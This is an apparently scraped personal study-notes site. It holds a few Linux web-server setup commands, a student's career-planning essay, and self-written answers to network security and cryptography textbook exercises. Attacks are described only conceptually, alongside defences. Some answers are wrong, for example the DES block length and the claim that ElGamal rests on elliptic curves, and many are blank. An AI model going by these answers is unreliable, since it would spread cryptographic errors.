[aaa@c2 ~]$ sudo mkdir /home/huangwenlong/public_html [aaa@c2 ~]$ sudo echo \"This is my web site huangwenlongggggg\" > /home/huangwenlong/public_html/index.html [aaa@c2 ~]$ sudo chown -R huangwenlong.huangwenlong /home/huangwenlong [aaa@c2 ~]$ sudo chmod 755 -R /home/huangwenlong 测试 [aaa@c2 ~]$ mkdir /var/www/web1 [aaa@c2 ~]$ mkdir /var/www/web2 [aaa@c2 ~]$ echo \"This is web111111\" > /var/www/web1/index.html [aaa@c2 ~]$ echo \"This is web222222\" > /var/www/web2/index.html 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/学校课程/就业指导.html":{"url":"5.其他/学校课程/就业指导.html","title":"就业指导","keywords":"","body":"毕业后的抉择：就业形势分析与个人发展规划 就业形势分析 当前就业形势概述 当前全球经济形势复杂多变，国内就业市场面临多重挑战。随着技术进步和产业结构调整，新兴产业不断崛起，同时传统行业也在不断变革。2023年的就业市场总体呈现出以下特点： 就业压力加大：受全球经济下行压力和疫情影响，企业招聘需求有所减少，毕业生就业竞争加剧。 结构性矛盾突出：高端人才需求增加，但基础岗位供大于求，部分专业毕业生面临就业困难。 新兴行业机会增多：数字经济、人工智能、绿色能源等新兴行业迅速发展，带来大量就业机会。 灵活就业趋势明显：自由职业、兼职和远程工作逐渐成为新的就业方式，更多年轻人选择自主创业。 行业分析 不同领域的就业前景有所不同，其中： 信息技术领域：人工智能、大数据、云计算等技术不断突破，相关岗位需求旺盛，薪资水平较高。 金融服务业：金融科技的发展推动了对专业人才的需求，如数据分析师、金融工程师等。 制造业：智能制造、工业互联网等新模式逐渐普及，需要大量技术研发和应用人才。 公共服务业：教育、医疗等公共服务领域的需求依然稳定，考公考编成为不少毕业生的选择。 自我分析 专业背景 作为一名计算机科学与技术专业的学生，我具备扎实的计算机理论基础和编程技能。在校期间，我系统学习了数据结构、算法、操作系统、计算机网络等核心课程，并在多次项目实践中积累了丰富的开发经验。 职业兴趣 通过对专业课程和实践项目的深入学习，我发现自己对人工智能和数据分析领域尤为感兴趣。尤其是机器学习和深度学习的应用，让我看到技术对社会发展的深远影响。 技能特长 编程能力：熟练掌握Python、Java、C++等编程语言，具有良好的代码编写和调试能力。 数据分析：掌握常用的数据分析工具和方法，如Pandas、NumPy、TensorFlow等，能够独立完成数据清洗、建模和预测分析。 项目管理：在多次团队项目中担任组长，积累了一定的项目管理经验，具备良好的沟通和协调能力。 毕业去向选择 就业 考虑到当前信息技术领域的广阔前景和自身的专业优势，我决定选择直接就业。信息技术行业不仅发展迅速，而且能够提供丰富的职业发展机会和较高的薪资水平，符合我的职业兴趣和发展目标。 选择企业类型 在企业类型的选择上，我倾向于以下几类： 互联网企业：如阿里巴巴、腾讯、字节跳动等大型互联网公司，技术水平高，发展机会多。 科技创新企业：如华为、百度等专注于技术研发的企业，能够接触到前沿技术。 初创企业：创新氛围浓厚，成长空间大，能够在多个岗位锻炼综合能力。 未来一年行动计划 为了实现顺利就业并在未来职业发展中取得成功，我制定了详细的行动计划： 第一季度：夯实基础，提升技能 深入学习专业知识：复习计算机基础课程，巩固数据结构、算法等核心知识。 参加在线课程：报名Coursera、Udacity等平台的高级课程，深入学习机器学习、深度学习等领域的前沿知识。 实战练习：参与Kaggle等平台的数据分析竞赛，积累项目经验，提高实战能力。 第二季度：求职准备 简历优化：根据目标岗位要求，优化个人简历，突出技术特长和项目经验。 面试准备：通过模拟面试、刷题等方式，提升面试技巧，特别是算法和编程题的解答能力。 投递简历：积极投递简历，争取获得多次面试机会，了解不同企业的需求和文化。 第三季度：实习与积累经验 寻找实习机会：通过学校招聘会、互联网平台等渠道，寻找实习机会，优先选择与职业目标一致的岗位。 积累实战经验：在实习过程中，努力工作，积累实际项目经验，提升自身能力。 拓展人脉：积极参加行业交流活动，与同事、同行建立联系，拓展职业人脉。 第四季度：就业选择与入职准备 评估实习表现：总结实习期间的工作表现，评估自己的优势和不足，明确改进方向。 确定就业目标：根据实习经历和求职情况，确定最终的就业目标企业和岗位。 入职准备：办理入职手续，熟悉企业文化和工作流程，做好职业生涯的规划和准备。 结论 面对复杂多变的就业形势，选择适合自己的职业发展道路至关重要。通过对当前就业市场的分析和自我评估，我决定在信息技术领域直接就业，并制定了详细的行动计划。相信通过不懈努力，我能够在职业生涯中不断进步，实现个人和职业目标。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/学校课程/网络安全技术与实践-书本习题答案.html":{"url":"5.其他/学校课程/网络安全技术与实践-书本习题答案.html","title":"网络安全技术与实践-书本习题答案","keywords":"","body":"第一章 引言 填空题 1.信息安全的三个基本目标是（），此外，还有一个不可忽视的目标是（） 保密性、完整性、可用性；合法使用。 2.网络中存在的四种基本安全威胁有（） 信息泄露、完整性破坏、拒绝服务、非法使用。 3.访问控制策略可以划分为（）和（） 强制性访问控制策略（MAC）和自主性访问控制策略（DAC）。 4.安全性攻击可以划分为（）和（） 被动攻击和主动攻击。 5.X800定义的五类安全服务是 认证、访问控制、数据保密性、数据完整性、不可否认性。 6.X800定义的8种特定的安全机制是 加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制、公证。 7.X800定义的五种普遍的安全机制是 可信功能度、安全标志、事件检测、安全审计跟踪、安全恢复。 思考题 1.简述通信安全、计算机安全和网络安全的联系和区别 通信安全指对通信过程中传输的信息施加保护；计算机安全是对计算机系统中的信息保护，包括操作系统安全和数据库安全；网络安全包括网络边界安全、Web安全和电子邮件安全等内容。 2.基本的安全威胁有哪些？主要的渗入类型威胁是什么？主要的植入类型威胁是什么？请列出几种主要的威胁。 基本安全威胁：信息泄露、完整性破坏、拒绝服务、非法使用。 主要渗入类型威胁：假冒、旁路控制、授权侵犯。 主要植入类型威胁：特洛伊木马、陷门。 3.安全领域中，除了采用密码技术的防护措施之外，还有哪些其他类型的防护措施？ 物理安全、人员安全、管理安全、媒体安全、辐射安全、生命周期控制。 4.什么是安全策略？安全策略有几个不同的等级？ 在某个安全域内，施加给所有与安全相关活动的一套规则。 等级：安全策略目标、机构安全策略、系统安全策略。 5.什么是访问控制策略？什么是MAC？什么是DAC？ 访问控制策略属于系统级安全策略，它迫使计算机系统和网络自动地执行授权。 MAC是强制性访问控制策略，由安全域中的权威机构强制实施，任何人不可回避； DAC是自主性访问控制策略，为特定的一些用户提供了访问资源的权限，此后可以利用此权限控制这些用户对资源的进一步访问。 6.主动攻击和被动攻击有什么区别？请举例说明？ 主动攻击是指恶意篡改或伪造数据流等攻击行为，包括：伪装攻击、重放攻击、消息篡改、拒绝服务攻击； 被动攻击是对所传输的信息进行窃听和监测，目标是获得线路上所传输，包括窃听攻击和流量分析。 7.网络攻击的常见形式有哪些？请逐一加以评述。 常见形式包括以下： 口令窃取，对于攻击者，有三种基本方式猜测口令，第一种是利用已知或假定的口令尝试登录，第二种是根据窃取的口令文件进行猜测（包含字典攻击），第三种是窃听某次合法终端之间的会话，并记录所用的口令。在防护上，可以加强对用户的培训，如果无法阻止选择低级的口令，那么需要对口令文件进行严格的保护。 欺骗攻击，是采用欺骗的方式获取登录权限。 缺陷和后门攻击，程序中的某些代码可能不能满足特定的需求，攻击者可以利用这些缺陷发起攻击。在编写网络服务器软件时，要充分考虑如何防止黑客的攻击行为（例如验证输入数据的正确性，例如验证输入数据的长度和存储区分配的占用情况），对输入语法做出正确的定义，必须遵守最小特权的原则。 认证失效，通过使认证机制失效实现攻击。应对方案是修改认证方案来消除缺陷，例如基于“挑战/响应”的认证机制。 协议缺陷，利用协议而不是系统的缺陷，例如TCP序列号攻击。 信息泄露，利用泄露的信息推理和分析，得到有价值的信息。 指数攻击，包括病毒和蠕虫，病毒依附于其他程序传播，蠕虫可自行传播，两者的传播方式具有指数增长的数学模型。如果不与受传染的主机通信，就不会感染病毒。 拒绝服务攻击，DoS攻击通过过度使用服务，让软件或硬件过度运行，使网络连接超出其容量，目的是造成自动关机或系统瘫痪，或者降低服务质量。DDoS攻击使用很多的Internet主机，同时向目标发起攻击。 8.请简述安全服务和安全机制之间的关系。 安全服务是一种由系统提供的对资源进行特殊保护的进程或通信服务。安全服务通过安全机制来实现安全策略。 9.请画出一个通用的网络安全模型，并说明每个功能实体的作用。 10.什么是安全威胁、安全防护和风险？ 安全威胁是指某个人、物、事件或概念对某一资源的保密细腻个、完整性、可用性或合法使用所造成的威胁。 安全防护是指保护资源免受威胁的一些物理的控制、机制、策略和过程。脆弱性是指在实施防护措施中或缺少防护措施时系统所具有的弱点。 风险是某个已知的、可能引发某种成功攻击的脆弱性的代价的测度。与价值和攻击成功的概率成正相关。 11.什么是授权？ 授权是安全策略的一个基本组成部分。所谓授权，指主体对客体的支配权利，规定了谁可以对谁做什么。 第二章 计算机网络基础 填空题 1.主机的IPv4的地址长度是多少位，MAC地址长度是多少位？ 32位，48位。 2.端口号长度是多少位，插口号长度是多少位？ 16位，插口即socket：48位。 3.一个主机的IP地址是211.103.25.233，所在子网的子网掩码是255.255.255.224，该主机所在子网的网络地址是多少，子网的广播地址是多少？ 略。 4.路由器至少拥有多少IP地址？ 2个。 5.TCP是（）连接的、提供可靠（）的协议。 面向连接；可靠端到端字节流传输。 6.228.141.32.0/23网络前缀是（）位，掩码是（）。 略。 简答题 1.简述分组交换的原理。 在发送端先把长的报文划分为较短的、固定长度的数据段，每个数据段前面加上首部构成分组，每一个分组的首部都含有地址等控制信息，把一个个分组转发到下一个路由器，最后在接收端处将根据首部信息，将分组重组恢复成原来的报文。 2.简述面向连接服务和无连接服务的优缺点。 面向连接服务需要在通信之前先建立连接，这种方式的连接服务具有可靠性和稳定性，但是占用通信信道资源，性能较差； 无连接是不可靠的连接，信息可能丢失，但不占用通信信道。 3.简述端口在通信中的作用。 端口是传输层概念。端口号是按照应用进程的功能对应用进程实行的标识。端口号与IP地址共同组成了socket，用于唯一标识某台主机上的某个进程。 4.简述一个TCP连接的过程。 在建立连接之前，先进行三次握手： （1）客户端向服务器发送SYN=1，seq=J的请求报文； （2）服务器回复SYN=1，ACK=1，ack=J+1，seq=k的确认报文； （3）客户端回复ACK=1，ack=k+1的确认报文。 随后一方每向另一方发送数据，都会收到一个响应报文以保证数据传输无误。 在结束通信时，进行四次握手： （1）主动关闭方发送FIN=1的请求报文； （2）被动关闭方收到报文后，回复一个ACK=1的确认报文； （3）被动关闭方发送FIN=1的请求报文； （4）主动关闭方回复一个ACK=1的确认报文。在四次握手时仍然可以进行通信，结束后断开连接。 5.简述缺省子网掩码的作用。 缺省子网掩码即未划分子网，对应的网络号的位都置1，主机号都置0。因为计算机计算与操作很迅速，可以提高分发效率。 6.简述路由器转发一个IP数据报的过程。 IP数据包的首部包含了源地址和目标地址。主机A会用本机配置的24位IP网络掩码255.255.255.0与目标地址进行与运算，得出目标网络地址与本机的网络地址是不是在同一个网段中。如果不是将IP数据包转发到网关。 在发往网关前主机A还会通过ARP的请求获得默认网关的MAC地址。在主机A数据链路层IP数据包封装成以太网数据帧，然后才发住到网关。当网关路由器接收到以太网数据帧时，发现数据帧中的目标MAC地址是自己的某一个端口的物理地址，这时路由器会把以太网数据帧的封装去掉。路由器认为这个IP数据包是要通过自己进行转发，接着它就在匹配路由表。匹配到路由项后，它就将包发往下一条地址。 7.简述本机地址的作用 当IP地址32位全为0时是本机地址，作为本机地址，作用是在发送DHCP请求时以本机地址作为源地址。 8.简述路由器的IP地址和网卡地址的对应关系。 每个网关的端口都有一个IP地址，通常路由器有两个MAC地址，一个用于LAN一个用于WAN。一个MAC地址可以对应多个IP地址。 9.简述内网地址的作用。 ipv4的地址有限，通过建设内网能够增大网络上主机的数量，并且划分内网能够方便对内网进行管理。 10.简述路由聚合的含义。 路由聚合是对于路由器而言的，能够将一些路由条目合并成更少的数目，减轻路由器负担。 第三章 Internet协议的安全性 填空题 1.主机的IPv4的地址长度为（）b，主机的MAC地址长度为（）b。IPv6的地址长度为（）b。 32位，48位，128位。 2.ARP的主要功能是将（）地址转换成为（）地址。 IP地址、MAC地址。 3.NAT的主要功能是实现（）地址和（）地址之间的转换，它解决了IPv4地址短缺的问题。 外网和内网。 4.DNS服务使用（）号端口，它用来实现（）或（）的映射。 53号、IP地址到域名、域名到IP地址。 5.SMTP服务使用（）号端口发送邮件；POP3服务使用（）号端口接收邮件；IMAP使用（）号端口接收邮件。 25，110，143 6.FTP的主要功能是实现文件的上传和下载，它的数据通道采用TCP的（）号端口，而其控制通道采用TCP的（）号端口。 20端口，21端口。 7.Telnet服务的功能是实现远程登录，它采用TCP的（）号端口。 23端口。 8.SSH服务的功能是实现安全的远程登录，它采用TCP的（）号端口。 22端口。 9.SNMP服务的功能是实现对网元的管理，它采用UDP的（）号端口。 161端口。 10.NTP服务使网络内的所有设备时钟保持一致，它使用UDP的（）号端口。 123端口。 简答题 1.简述以太网上一次TCP会话所经历的步骤和涉及的协议。 如果本地没有ARP表，发送ARP请求建立ARP表。向目的IP发送SYN建立请求，对方回复SYN、ACK报文，我方再回复ACK报文，建立TCP连接。然后发送TCP报文。 2.在TCP连接建立的3步握手阶段，攻击者为什么可以成功实施SYN Flood攻击？在实际中，如何防范此类攻击？ 服务器响应SYN报文时，会建立一个连接监听，当收到大量的SYN报文时，服务器就会超出负载。防范的方法包括：建立防火墙或者加固TCP/IP协议栈。 3.如何封装一个源路由数据包？允许这种数据包通过防火墙会对内部网络安全造成什么影响？ 源路由选项是IP数据包头部的选项，在打开这个选项时，路由器会在字段中添加路由信息。恶意的路由器可以制造假的路由信息对网络进行攻击。 4.为什么UDP比TCP更加容易遭到攻击？ UDP连接不验证对方，更容易被欺骗。也相比TCP缺少各种机制，包括拥塞控制、校验等。 由于UDP自身缺少流控制特性，所以采用UDP进行大流量的数据传输时，就可能造成堵塞主机或路由器，并导致大量的数据包丢失；UDP没有电路概念，所以发往给定端口的数据包都被发送给同一个进程，而忽略了源地址和源端口号；UDP没有交换握手信息和序号的过程，所以采用UDP欺骗要比使用TCP更容易。 5.为什么路由协议不能抵御路由欺骗攻击？如何设置路由器抵御这一攻击？ 6.写出DNS服务的CheckList(安全检查步骤)。 7.通过DNS劫持会对目标系统产生什么样的影响？应该如何避免？ 通过劫持了DNS服务器，通过某些手段取得某域名的解析记录控制权，进而修改此域名的解析结果，导致对该域名的访问由原IP地址转入到修改后的指定IP，其结果就是对特定的网址不能访问或访问的是假网址。 避免DNS劫持：暴露的主机不要采用基于名称的认证；不要把秘密的信息放在主机名中；进行数字签名。 8.简述IPv6和IPv4的数据包格式的异同。在IPv4网络上打通IPv6隧道的方式有哪些？ IPv6和IPv4之间的最大差别在于：IP地址的长度从32位到128位。通过裁剪IPv4报头中的某些字段，或把一些字段移入到扩展报头中，IPv6基本报头的总长度大大减小了。IPv6使用固定长度的基本报头，从而简化了转发设备对IPv6报文的处理，提高了转发效率。尽管IPv6地址长度是IPv4地址长度的4倍，但IPv6基本报头的长度只有40字节，为固定的IPv4报文头长度(不包括选项字段)的2倍。 IPv6和IPv4网络能否互通？如果可以，需要哪些辅助措施？ 可以。双栈协议、隧道技术、协议转换。 10.能否在ARP层进行会话的劫持？如果能，原理是什么？ ARP攻击。 11.黑客为什么可以成功实施ARP欺骗攻击？在实际中如何防止ARP欺骗攻击？ 原因：因为ARP协议有漏洞。 如何防止ARP欺骗攻击：配置802.1x协议，或者采用静态arp表。 12.判断下列情况是否可能存在？为什么？（1）通过ICMP数据包封装数据，与远程主机进行类似UDP的通信。（2）通过特意构造的TCP数据包，中断两台机器之间指定的一个TCP会话。 （1）可能。 （2）可能。 13.什么是ICMP重定向攻击？如何防止此类攻击？ ICMP提供了IP路由和交付问题的关键反馈信息。攻击者利用ICMP可以对路由进行重定向攻击；在防火墙中禁用ICMP功能；防火墙应该具有状态检测、细致的数据包完整性检查和很好的过滤规则控制功能。 14.在内部以太局域网中，能否根据一个ARP地址(MAC地址)唯一确定一台主机？能否根据给定的一个ARP地址唯一确定拥有者的身份？ 主机的MAC地址唯一且固定。但不能表示身份。 15.DNS可能遭到的攻击有哪些？DNSsec协议有哪些优点？ 缓存DNS投毒、DNS劫持、域名劫持、DNS ddos攻击等。 DNSsec协议优点：DNSsec是DNS的安全扩展，可以对DNS记录进行数字签名。 16.在邮件应用中，IMAP与POP相比较，最大改进是什么？ IMAP是分布式的，具有摘要阅读、选择性下载附件、服务器缓存。 FTP和H.323都被称为动态协议，为什么？ 18.使用SSH进行通信是否能够避免会话劫持？为什么？ 不能。 SSH的信息交换基于主机密钥，如果没有可信的认证机构对服务器的真实性进行验证的话，可能会被欺骗。 SNMPv1和SNMPv3有哪些不同？SNMPv3中主要做了哪些改进？ SNMPv3主要针对安全做了改进，包括加密算法、身份认证。 20.简述在多播通信中，通信各方发送数据包的类型，以及源、目的地址的特征。 是基于UDP的组播数据包。源地址是本机地址，目的地址是组播地址。 21.电子邮件系统通常面临哪些安全风险？在实际中，人们采用哪些安全措施来提高邮件系统的安全性？ 窃听、篡改、DDOS攻击、蠕虫等。身份认证、消息加密、防火墙检测。 22.FTP服务存在哪些安全风险？应如何做才能消除或减少这些安全风险？ FTP反弹攻击，伪装FTP请求，口令泄露，ftpd权限问题。限制port命令的使用，密文传输数据，身份认证。 23.请比较Telnet和SSH协议的异同，并用Sniffer软件捕捉其数据包查看两者的数据包内容有何不同。 同： 两种协议都可以远程登录另一台主机 两种协议都属于基于TCP/IP的协议 异： telnet是明文传送；ssh是加密传送，并且支持压缩。 telnet的默认端口号为23；ssh的默认端口号为22。 ssh使用公钥对访问的服务器的用户验证身份，进一步提高的安全性；telnet没有使用公钥。 24.简述H.323协议与 SIP的异同。 H.323沿用的是传统的实现电话信令模式，比较成熟，已经出现了不少H.323产品。H.323符合通信领域传统的设计思想，进行集中、层次控制，采用H.323协议便于与传统的电话网相连。SIP协议借鉴了其它因特网的标准和协议的设计思想，在风格上遵循因特网一贯坚持的简练、开放、兼容和可扩展等原则，比较简单。 密码学基础 第四章 单（私）钥密码体制 填空题 1.密码体制的语法定义由以下6部分构成：（） 明文消息空间M、密文消息空间C、加密密钥空间K、有效的密钥生成算法ξ、有效的加密算法E、有效的解密算法D。 2.单(私)钥加密体制的特点是（）所以人们通常也称其为对称加密体制。 双方采用的密钥相同。 3.古典密码有两个基本工作原理：（）和（）。 代换、换位。 4.对明文消息的加密有两种：一种是将明文消息按照字符(如二元数字)逐位地加密，称为（）；另一种是将明文消息分组(含有多个字符)，逐组地进行加密，称为（）。 流密码、分组密码。 5.在理论上，加密信息的安全性不取决于（）的保密，而取决于（）的保密。 算法、密钥。 6.美国数据加密标准DES的密钥长度为（）位，分组长度为（）位。 64b明文，56b密钥，分组长度32b。 7.新一代数据加密标准AES的密钥长度是（）位，分组长度是（）位。 128、192、256b均可；128b。 A5是欧洲蜂窝移动电话系统中采用的加密算法，用于（）到（）线路上的加密。A5的唯一缺点是（）。 电话手机到基站；缺点是移位寄存器级数段，可以用穷举法破解。 9.试列举5种常用的分组密码算法：（） DES、rijndael、MARS、RC6、Serpent、SM4。 10.分组密码常用的工作模式有5种：（） ECB（电码本）、CBC（分组链接）、OFB（输出反馈）、CFB（密码反馈）、CTR（计数器）。 11.祖冲之密码本质上是一个密钥序列产生算法，其输入为（1）比特的初始密钥和（2）比特的初始向量，输出为（3）比特的密钥字序列。其逻辑上分为3层，分别是（4）。 （1）128、（2）128；（3）32；（4）三层包括：16级线性反馈移位寄存器、比特重组、非线性函数F。 SM4密码的分组长度和密钥长度分别为（1）和（2）。加密算法采用（3）轮迭代处理。 （1）128bit；（2）128bit；（3）32轮。 思考题 1.加密算法为什么不应该包含秘密设计部分？从理论上讲，数据的保密是取决于算法的保密还是密钥的保密？为什么？ 公开好的算法，可以接受更多的攻击验证加密算法的强度。 2.弗纳姆密码是一种代换密码吗？它是单表代换还是多表代换？ 是。多标。 3.弗纳姆密码和一次一密体制的不同之处是什么？ 没有限制一次。 4.为什么说一次一密加密抗窃听是无条件安全的？ 因为完全随机的密文无法破解。 5.虽然简单代换密码和换位密码对频度分析攻击是十分脆弱的，为什么它们仍被广泛使用在现代加密方案和密码协议中？ 代换密码+换位密码的叠加使用，是数学上证明了的能够抵抗频度分析攻击的密码体制。 6.流密码是单钥体制还是双钥体制？它与分组密码的区别是什么？ 单钥体制。流密码针对单个元素、是基于时间变化的加密变换，分组密码针对单元大小确定分组进行固定变换。 7.现代密码通常是由几个古典密码技术结合起来构造的。在DES和AES中找出采用了下述3种密码技术的部分：1代换密码；2换位密码；3弗纳姆密码。 置换： AES的分组长度和密钥长度是多少？AES的引入对密码学带来的积极影响有哪些？ 128；128、192、256。 积极影响：安全强度增加，能简化协议和系统的设计；导致新的同样强度的杂凑函数出现。 9.为什么AES被认为是非常有效的？在AES的实现中，有限域F2^8，中的乘法是如何实现的？ AES算法是均衡了软件实现、硬件实现、时空资源占用等因素的最终方案。 从密码学角度，AES没有对未知数学问题的依赖，即为数学可证明的安全。 从产品角度，在AES算法被标准化后，很多硬件芯片和软件工具都实现了对AES的支持。因此应用AES有助于减少工作量和失误。 从安全角度，128位及以上AES还没有出现过破解。 伽罗华域中乘法运算其实是域中元素对应的多项式的乘法运算，相加时为模2加法。 10.在分组密码的密码分组链接(CBC)运行模式下，如果收到的密文的解密“有正确的填充”，你认为传输的明文有有效的数据完整性吗？ 11.为什么祖冲之密码算法在完成初始化进入工作状态后，将算法第一次执行过程的输出W舍弃？ 12.试从算法角度，对SM4与AES进行比较。 第五章 双（公）钥密码体制 填空题 1.在双钥密码体制中，若以（）作为加密密钥，以（）作为解密密钥，则可实现多个用户加密的消息只能由一个用户解读；若以（）作为加密密钥，以（）为解密密钥，则可实现一个用户加密的消息能由多个用户解读。 公钥、私钥；私钥，公钥。 2.对于双钥密码体制来说，其安全性主要取决于（），要求加密函数具有（）。 构造双钥密码算法所依赖的数学问题。单向性。 3.DL问题是指已知y，g，p，求（）的问题；DHP问题是指已知αa和αb，求（）的问题；FAC问题是指已知n=p·q，求（）和（）的问题。 x，α^ab，p和q。 4.双钥密码体制需要基于单向函数来构造，目前多数双钥体制是基于（）、（）、（）和（）等问题构造的。 DHP、FAC、DL、多项式求根。 RSA密码体制易于实现，既可用于（）又可用于（），是被广泛应用的一种公钥体制。 加密、数字签名。 针对 RSA密码体制的选择密文攻击，包括（）、（）和（）等方式。 消息破译、骗取仲裁签名、骗取用户签名。 7.ElGamal密码体制是一种基于（）的双钥密码体制，其加密密文是由明文和所选随机数k来确定，因而属于（）加密。 椭圆曲线密码ECC。 8.椭圆曲线密码体制利用有限域上的（）所构成的群上定义的（）构造双钥密码体制。 GF(2^m)，素曲线。 9.基于身份的密码体制，使用椭圆曲线上的（） ，将用户的身份映射为（）。 10.中国商用公钥密码标准算法 SM2算法是一组基于（）的公钥密码算法。SM2公钥加解密算法中包含3类辅助函数，分别为（）。 思考题 1.什么是单向函数？什么是陷门单向函数？ 对于可逆函数y=f(x)，很难通过y求得x，则称单向函数。 在给定某条件时，容易计算y=f(x)及其逆；在没给条件时，很难通过y求得x。 2.双钥体制的安全性均依赖于构造双钥算法所依赖的数学难题。那么RSA算法是基于一种什么数学难题构造的？ 大素数分解。 3.离散对数问题与计算Diffie-Hellman问题有什么关系？ diffie-hellman问题的破解本身是一个离散对数问题。 4.在RSA公钥数据(e，N)中，为什么加密指数e必须与φ(N)互素？ 只有e与phin互素时，能求出ed=1(mod phin)。 5.通常情况下分解奇合数是困难问题。那么分解素数的幂也是困难问题吗？(一个素数幂是N=p^i，其中p是素数，i是整数。分解N。)(提示：对任意i＞1，计算N的i次根需要尝试多少个指数值i?) 当i比较大时不是。 RSA加密函数可以看做RSA模数乘群上的一个置换，所以RSA函数也称为单向陷门置换。ElGamal加密函数是单向陷门置换吗？ 7.在什么情况下可以把ElGamal密码体制看做是确定的算法？ 8.与RSA相比，ECC的主要优点是什么？试将两者进行比较。 9.SM2公钥加解密算法与椭圆曲线ElGamal公钥加解密算法相比，有什么相似之处？有什么不同之处？SM2公钥加解密算法增加了何种功能？试将两者进行比较。 10.什么是CPA，CCA和CCA2?为什么所有公钥加密算法都必须抵抗CPA？ 11.由于主动攻击通常要修改网络上传输的(密文)消息，那么如果公钥加密算法用了数据完整性检测技术来检测对密文消息的非授权修改，主动攻击仍然会有效吗？ 第六章 消息认证与杂凑函数 填空题 1.可以用来产生认证符的函数类型可分为3类，分别为（）、（） 和（） 消息加密、消息认证码、杂凑函数。 2.消息加密本身提供了一种认证手段。应用于消息加密的两种体制分别（） 对称加密和公钥加密。 3.消息认证码又称（），也是一种 （），它利用（）来生成（）是并将其附加在消息后。 MAC，认证技术。密钥，固定长度的短数据块。 4.杂凑函数的四种性质：（） 5.消息认证码的函数形式是 （），其中，M是（），K是（）, Ck(M)是（）。 6.迭代杂凑函数的构造方法：（）和（） MD5的实现：①（）：用32b软件易于高速实现。②（）：描述简单，短程序可实现，易于对其安全性进行评估。③（）。 8.美国NIST和NSA设计的一种标准算法（），既可用于（），也可用于其他需要用（）算法的情况。 9.（）是中国国家密码管理局于2010年颁布的一种商用密码杂凑函数，该算法消息分组为（），输出杂凑值长度为（），采用（）结构。 10.RFC2104给出了HMAC的设计目标：(1)可不经修改而使用现有的（），特别是那些易于（）、源代码可方便获取且免费使用的（）。(2)（），(3)（） ，(4)（） ，(5)在对镶嵌的杂凑函数合理假设的基础上，（） 杂凑函数；软件实现；杂凑函数；内嵌杂凑函数可替换；保持杂凑函数的性能；以简单的方式使用和处理密钥。易于分析HMAC用于认证的密码强度。 HMAC最吸引人的地方是它的设计者已经证明了（）和（）之间的确切关系，证明了对HMAC的攻击等价于对（）的下述两种攻击之一：(1)（），(2)（）。 算法的强度和嵌入的杂凑函数的强度。内嵌杂凑函数。计算输出、计算碰撞。 思考题 1.什么是消息认证码（MAC）？它与消息杂凑值的主要区别是什么？ 前者需要密钥。 2.什么是篡改检测码(MDC)？ MDC是如何产生和怎样使用的？消息认证码（MAC)是MDC吗？(消息的)数字签名是MDC吗？ 3.说明消息认证码的基本用途。 4.杂凑函数具有哪些性质？ 5.列举迭代杂凑函数的构造方法。 6.为什么说杂凑函数实际上是不可逆的？ 7.对称和非对称数据完整性技术的主要区别是什么？ 8.设杂凑函数的输出空间大小为2160b，找到该杂凑函数碰撞所花费时间期望值是什么？ 9.比较MD-4，MD-5，SHA及SM3的异同点。 10.什么是HMAC? HMAC的设计目标是什么？ 第七章 数字签名 填空题 1.类似手书签名，数字签名也应满足四条（）。 收方能确认、不能伪造；发方不能否认；收方不可否认；第三者可确认、不能伪造 2.按明、密文的对应关系划分，数字签名可以分为（）和（）。 确定性数字签名，随机化数字签名。 3.RSA签名体制的安全性依赖于（）。 大素数分解问题的困难性。 ElGamal签名体制的安全性依赖于（）。 求离散对数的困难性。 5.不可否认签名的本质是（）。 在无签名者合作的条件下不可能验证签名，从而可以防止复制或散布他所签文件的可能性。 6.群签名是面向（），其目的是（）。 群体密码学，对签名者实现匿名保护。 SM2是国家密码管理局于2010年颁布的基于（）密码算法，具体包括两个算法1个协议，分别是（）、（）和（）。 椭圆曲线。 思考题 1.分析RSA算法存在的安全缺陷。 随着计算机性能的提升，大素数分解问题的难度下降；还没有确信的方法证明RSA的安全性等价于大素数分解问题；没有确信的方法证明NP不属于P。 2.查找并阅读SM2椭圆曲线公钥密码算法标准，了解算法流程，构思一种SM2数字签名算法的应用场景。 3.比较ElGamal签名体制与SM2签名算法的异同。 4.比较RSA签名体制、E1Gamal签名体制和Schnorr签名体制的异同。 5.比较签名标准算法DSA与ElGamal签名体制的异同。 6.编程实现SM2椭圆曲线数字签名方案。 7.什么是不可否认签名、防失败签名、盲签名和群签名？ 8.当签名与加密结合时，有两种顺序：一种是先加密后签名，另一种是先签名后加密，试比较这两种方式的安全性。 第八章 密码协议 填空题 1.计算机网络中使用的好的协议，不仅应该具有（）性、（）性、（）性，而且应该具有足够高的（）性。 有效性、公平性、完整性、安全性。 2.为有效地防止中间人攻击，在密钥交换协议中应采用（）技术。 数字签名。 3.密钥建立协议主要分为（）协议和（）协议。 单钥体制的密钥交换协议和采用双钥体制的密钥交换协议。 Diffie-Hellman算法的安全性是基于（）。 在有限域上计算离散对数的困难性。 5.密钥认证分为（）三种。 隐式密钥认证、密钥确证、显示密钥认证。 6.认证包含三种（）。 7.认证的密钥建立协议有十种（）。 8.密码攻击的目标有（）、（）和（）。 密码算法、密码技术、协议本身。 9.对协议进行攻击的典型方法有四种（） 已知明文攻击、选择密文攻击、预言者会话攻击、并行会话攻击。 10.对密码协议的安全性进行分析的方法有（）和（）。 攻击检验方法、形式语言逻辑证明。 思考题 1.什么是协议？协议具有哪些特点？协议有几种类型？ 是两个或多个实体为了完成某个特定任务而规定的步骤。特定包括确定性、交互性和目的性。 类型：协议分为仲裁协议（存在仲裁者：公正第三方），裁决协议（存在裁决人：解决纠纷），自动执行协议（最好的协议，保证公平性）。 2.什么是仲裁协议？仲裁协议有哪些特点？ 3.什么是裁决协议？裁决协议有哪些特点？ 4.什么是自执行协议？自执行协议有哪些特点？ 5.一个好的协议应具备哪些特点？ 有效性、公平性、完整性、安全性。 6.按照密码协议的功能来分类，密码协议可以被分成哪几类？ 密钥建立协议、认证协议、认证的密钥建立协议。 7.什么是中间人攻击？中间人攻击能够成功实施的真正原因是什么？ Diffie-Hellman算法能否用来对消息进行加密和解密？为什么？ 9.掺杂是对付字典攻击的有效方法。请问它是否能抗击对单一口令的预定攻击？为什么？ 10.在密码协议中，一次性随机数(Nonce)和时戳(Timestamp)的作用是什么？ 11.对密码协议进行安全性分析有哪几种方法？ 网络安全技术与应用 第九章 数字证书与公钥基础设施 选择题 1.数字证书将用户与其（）相关联 A.私钥 